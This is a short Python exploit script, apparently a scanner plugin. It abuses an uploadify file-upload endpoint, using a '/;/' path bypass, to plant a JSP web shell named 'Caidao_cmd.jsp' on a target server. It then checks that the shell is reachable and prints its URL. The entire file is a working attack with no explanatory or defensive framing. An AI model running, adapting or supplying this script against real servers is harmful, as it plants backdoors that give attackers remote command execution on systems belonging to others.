from urllib3 import encode_multipart_formdata
import requests,os,random

shell_name = 'Caidao_cmd.jsp'

def post_files(url,header,filename):
    data = {}
    data['imgFile']= (random_name(6,'.jsp'),open(scriptPath+'\\execScripts\\'+filename,'rb').read())
    encode_data = encode_multipart_formdata(data)
    data = encode_data[0]
    header['Content-Type'] = encode_data[1]
    r = requests.post(url, headers=header, data=data, verify=False)
    return r.text

def random_name(index,suffix=''):
    h = "abcdefghijklmnopqrstuvwxyz0123456789_"
    salt_cookie = ""
    for i in range(index):
        salt_cookie += random.choice(h)
    return salt_cookie+suffix

scriptPath = os.getcwd()
def check(**kwargs):
    shell_path = post_files(kwargs['url']+"/;/plugins/uploadify/uploadFile.jsp?uploadPath=/plugins/uploadify/",{"cookie":"test"},shell_name)
    if requests.get(url=kwargs['url']+'/;/plugins/uploadify/'+shell_path.strip(),verify=False,timeout=5).status_code !=404:
        print('[*]上传的shell路径: '+kwargs['url']+'/;/plugins/uploadify/'+shell_path.strip())
    else:
        print('[-]上传失败: '+shell_path)
if __name__=="__main__":
    pass